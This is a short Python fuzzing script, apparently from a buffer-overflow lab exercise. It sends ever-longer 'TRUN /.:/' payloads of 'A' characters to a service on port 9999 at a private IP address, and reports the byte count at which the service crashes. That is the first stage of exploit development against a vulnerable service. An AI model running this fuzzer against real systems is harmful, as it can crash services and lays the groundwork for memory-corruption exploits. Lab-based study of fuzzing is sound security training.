#!/usr/bin/python

import sys
import socket
from time import sleep

buffer = "A" * 100

ip = "192.168.1.11"
port = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

        data = "TRUN /.:/" + buffer

        s.send((data.encode()))
        s.close()

        sleep(1)
        buffer += "A" * 100

    except:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        sys.exit()
